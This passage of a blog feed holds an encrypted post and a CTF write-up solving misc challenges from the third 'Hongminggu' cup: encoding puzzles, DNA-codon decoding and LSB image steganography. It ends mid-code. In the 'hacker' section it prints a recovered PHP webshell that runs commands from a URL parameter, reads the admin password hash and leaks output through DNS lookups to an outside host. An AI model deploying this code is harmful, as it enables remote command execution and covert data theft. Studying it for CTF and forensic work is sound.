e33e374d7da8af8766d12bdfac31693694e93912febe8c9b326c495148ff7bce32f49cb0562ef312b6907665698244a8d7aa91a549c387b7847ef50736c78131d48bfe970b03daed0bab9820ceb7f9521568cc7dbcebfd94345ec535d25162fe4c00c3b0df6b74cadbbfeb8ee977f002f84ddd527e057cbf3c4fa8048c04108ba7aa4035eb9355dd008df8e79f1e4d9022a910801a80700ae477d7f031d48ae1014a2bf136f51c58f7aee20e89d3a92adecfe6abdab90cdb5eeef24e0037552e17c385c59c54d3419812265b7514368dfbff68d3789278757c5b3162d0240c5a4fb4dbbf6de1c7eb4f0200c2ab11f137b1548bd7bdf5c10d23902c239a6b2deb1f55ea109d3a494fe8fe7e8c76bdd67e5cec9c9c07bfdf7137de29e98073c95c5d79234fe90cf481636de5a5f76171a768a41c34987142414b770a7ddc7bce194ede007c84208494331576257db2fddf0824bb9b83f27d4e232af3a56b5d33a87d1687d8c744ea3a76de6bcaba27b04d390c6ad2cd68911878e581e1964850b782628f43a8984505ff55235c2ca022a1888b009a4e0dfe65da3e729a42d09f580d52d37291f830b1771a0ab825dd2794a6e3bf372250a1fa0c09133b373aeabb179abbe4bf4a462b234054e70abf26a10392a9badf444f4e1487f42c9150f765dc9b766d17c74306b92c5444b6e5d74b5205d8564d524f452371c4b390a8a9629136d04ff0dd568ddc2df3e4f7c92ff4198046bfeb4909e819fb7611677db321a22d6826fe51ea17d67e8cffca07388e930526049827f16ebcdec7fe51ee8529d91263328905da2ab3dcdc8705acf1344f5b4562637a279b7714aa26da88bfee1c4621f6fbb95d458adc32ca25e71987fe0b44237cd920758535aac4bf7f2767ad872cd253230ab29053d8dbe32695d2c78ef86c8b1ef50d379f3f95eeda0e1f8b670523a5ac132a6671e9b3c7b4fe8bef2d80e907842c36e43f799cb26c4cdf1eb9c29576a299ab2676941d6c5c34af8fbe17ab58e80010b2abad69ccc51615c1e3bb7c20c42e47e975ca9aaad4a56b985f11ecd839ca21b67bc057cd0369c5dcfec75671e24b145190a68792aa0370487f1bdfaf9665e0726d962f47e449ad9f37f1658949806d4c60ea358d9596c3df589304fe4653606158c8424e66a446c307a9598bf53cf442d14f00141e45d4b763dbb2b3a5d3cb8e40cdb6f8be7479313340ea0e3a8ad437516aff32c6e2d51b9becadbae10c6bea3e29fa070855f6195752e0f68f3eb6460d1ea5215f5d821c050a93cf079ca382be73ba5bcea0083387359b663425d14a07aa90a2b2665d1e43da8b7addfcf2e812535745343fe4dd882c8aa54d13c976306e085ef994350a067e902855739c19365b7107e9e7398b81bc1dd6092c287a0155ce4aee4fdc0f9d4aa162ffbd05f4ed978b75a7ffec9a8896a2c5c3e56142545878b10346166c33c29746b048d5c6530ea606420edd5aa791153d114e4c17ce1e995bf5dc723bfee2e8cbe4cb4222e1e4fe369ef254d17ffe1034ab72bfded2b6bdbc73c61f400cd68b0dc7bdcb76d7679f1748ae6447d7f62c4adbfcc4f2496b2e49b6c465b4ab3c01ea952f77def5dd43a0c2848200cac33952c5fd071b9d7a0e614cf0cc23e7d7eaceaa42c5516b6f84c99707ab44e664cd54eed0d6f9a89c8eb7d395fa88d1bc35c0cfc46c15e1e2778187a8b677e03bee7ca9b4731d1e01ab22802365ed0fd0281b1222e4c397910c72888493cb04af877cfa1a3c95b1f1ed06d8c955e47cc2e5a1e0ced1cdf92497ad420d720396c03133a131d4fdaa04872c53e17a8f8607392b4d29870987c566c3f6487dd43be271f664b4c5b5d7c6a9a8359b1238c91845a8d592a7b30149370e16a8a660c053584daf3cb2f1d78bf70769013192ab3ca1e851513d7b878f64f1d614298c57e7a9e80a925584c1eed6b4b525a6e273b5174373a52850c952b69c1060330b9a57411ee14356bb499323af2ec6176f3bf91e387f544e64a8f4c5d2f8d0fb4b9aa7ac00fbc1a2267762c4c0e97a390846c6427f5f285ffa161bfeb84c9cdc29e2d87f4042f26fb8f9aecc3ea1f5bb594d78e716b6586d04b498086cba8959f35ddb8ccbc283ef1951ed1d3664b2098de05399869e1b592b788aa820960632441270c2a1e2c1ea73e84a6b4526c112ae09108c1ce516e3bd916e351d57f1d8c6d605cb76ec8af7763d233a0947c1f99df381ffcc558b13d578c0123d411bfae7636ccb1f5274f6b74ccf2ef2a2dcb066c9f4fcb3859330a8d5e085162c10f4919611dacbbff2ea68a7844fbca543b7d0f75330d91e7c3c6c20bcb6249884e1455a0be22ead17c33ed79667e7949aaf1a1e8687b1cf34b144a7d4ce6056fa38bcd850cb785a4b081958f2c55120bfa5b21f0bff7b953a5958a8fbe319bebf7f1d4b5c405dc519dd1bab56eef10</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="hw" scheme="https://www.lewiserii.top/categories/hw/"/>
    
    
    <category term="hw" scheme="https://www.lewiserii.top/tags/hw/"/>
    
    <category term="面试" scheme="https://www.lewiserii.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>第三届&quot;红明谷&quot;杯网络安全大赛wp</title>
    <link href="https://www.lewiserii.top/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/wp/%E7%AC%AC%E4%B8%89%E5%B1%8A%E2%80%9D%E7%BA%A2%E6%98%8E%E8%B0%B7%E2%80%9C%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bwp.html</id>
    <published>2023-04-19T01:30:00.000Z</published>
    <updated>2023-04-20T10:31:31.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="阿尼亚"><a href="#阿尼亚" class="headerlink" title="阿尼亚"></a>阿尼亚</h2><p>文件尾有一串字符串<code>6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061</code>，十六进制转字符串得到<code>c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a</code></p><p>C383明显是中文编码，转十六进制后爆破得到密码<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-1.png"></p><p>根据图片名字<code>netpixeljihad</code>，使用<code>PixelJihad</code>解密，密码是<code>简单的编码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-2.png"></p><p>得到压缩包的密码<code>P@Ss_W0RD:)</code></p><p>解压得到<code>+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-</code></p><p><a href="https://www.dcode.fr/code-decabit">在线解密</a>一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-1-3.png"></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h2><p>流量分析，发现有个<code>shell.php</code>上传了一个<code>xxx1.php</code>，然后执行了<code>ls</code>和<code>cat secret.txt</code></p><p>格式化后如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$servername</span>=<span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$password</span>=<span class="hljs-string">&quot;123456&quot;</span>;<br><span class="hljs-variable">$dbname</span>=<span class="hljs-string">&quot;zentao&quot;</span>;<br><span class="hljs-variable">$conn</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-string">&quot;mysql:host=<span class="hljs-subst">$servername</span>;dbname=<span class="hljs-subst">$dbname</span>&quot;</span>,<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">setAttribute</span>(PDO::<span class="hljs-variable constant_">ATTR_ERRMODE</span>,PDO::<span class="hljs-variable constant_">ERRMODE_EXCEPTION</span>);<br><span class="hljs-variable">$stmt</span>=<span class="hljs-variable">$conn</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT password FROM zt_user WHERE account=\&#x27;admin\&#x27;&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><span class="hljs-variable">$result</span>=<span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);<br><span class="hljs-variable">$conn</span>=<span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$result</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-variable">$output</span>=<span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$param</span>);<br><span class="hljs-variable">$hex_output</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$output</span>);<br><span class="hljs-variable">$hex_password</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$password</span>);<br><span class="hljs-variable">$len_output</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_output</span>);<br><span class="hljs-variable">$len_password</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_password</span>);<br><span class="hljs-variable">$max_subdomain_length</span>=<span class="hljs-number">62</span>;<br><span class="hljs-variable">$subdomain_base</span>=<span class="hljs-string">&quot;yafgcy.ceye.io&quot;</span>;<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$len_output</span>;<span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-variable">$char_output</span>=<span class="hljs-variable">$hex_output</span>[<span class="hljs-variable">$i</span>];<br><span class="hljs-variable">$char_password</span>=<span class="hljs-variable">$hex_password</span>[<span class="hljs-variable">$i</span>%<span class="hljs-variable">$len_password</span>];<br><span class="hljs-variable">$char_xor</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_output</span>)^<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$char_password</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>.<span class="hljs-variable">$char_xor</span>)&gt;<span class="hljs-variable">$max_subdomain_length</span>) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-variable">$hex_xor</span>=<span class="hljs-string">&quot;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$hex_xor</span>.=<span class="hljs-variable">$char_xor</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hex_xor</span>)%<span class="hljs-number">2</span>!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;0&quot;</span>.<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$subdomain</span>=<span class="hljs-string">&quot;<span class="hljs-subst">$hex_xor</span>.<span class="hljs-subst">$subdomain_base</span>&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$subdomain</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现是<code>dns</code>流量</p><p>提取出<code>secret.txt</code>，根据代码可知要与<code>admin</code>的密码进行异或</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">79227024716c7522787370254c777230667673222570247b76677322632671<br>d7b357226771575227a7372237677702573611f372570317b7672772076206<br>1479207024777b60247e6674231a626727666171372570317f766773207620<br>067879226731756c60206d75703670754e<br><br>password:8a3e684c923b763d252cf1e8734a7a29<br></code></pre></td></tr></table></figure><p>异或后发现是<code>DNA</code>编码，每62位会少内容，爆破就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span> <br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment"># pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure><h2 id="X光的秘密"><a href="#X光的秘密" class="headerlink" title="X光的秘密"></a>X光的秘密</h2><p>给了个<code>task.dcm</code>文件，百度到能打开的软件<a href="https://www.microdicom.com/downloads.html">MicroDicom</a></p><p>使用软件导出，一共有二十张</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/2023hmg-misc-2-1.png"></p><p>使用stegsolve发现最后三张图存在LSB</p><p>脚本提取出最低位数据，因为是灰度图，所以用其中一个通道就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;img-00001-00018.png&#x27;</span>)<br>w,h=img.size<br><br>rgb=[<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>]<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        data=img.getpixel((i,j))<br>        rgb[<span class="hljs-number">0</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">0</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">1</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">1</span>]%<span class="hljs-number">2</span>)<br>        rgb[<span class="hljs-number">2</span>]+=<span class="hljs-built_in">str</span>(data[<span class="hljs-number">2</span>]%<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;r1: &#x27;</span>+rgb[<span class="hljs-number">0</span>])<br><span class="hljs-comment">#print(&#x27;glow: &#x27;+rgb[1])</span><br><span class="hljs-comment">#print(&#x27;blow: &#x27;+rgb[2])</span><br><br><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r1.txt&quot;</span>, <span class="hljs-string">&quot;w+&quot;</span>)<br>content = <span class="hljs-built_in">str</span>(rgb[<span class="hljs-number">0</span>])<br>file.write(content)<br>file.close()<br></code></pre></td></tr></table></figure><p>img-00001-00018.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">100100010010110001101000000000<br></code></pre></td></tr></table></figure><p>img-00001-00019.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0110000110101001010000000000000<br></code></pre></td></tr></table></figure><p>img-00001-00020.png</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0001011001000010000010000000001<br></code></pre></td></tr></table></figure><p>将三张图片按顺序拼接发现刚好是<code>10001001</code>，<code>0x89</code>为<code>PNG</code>的头</p><p>使用脚本合并</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 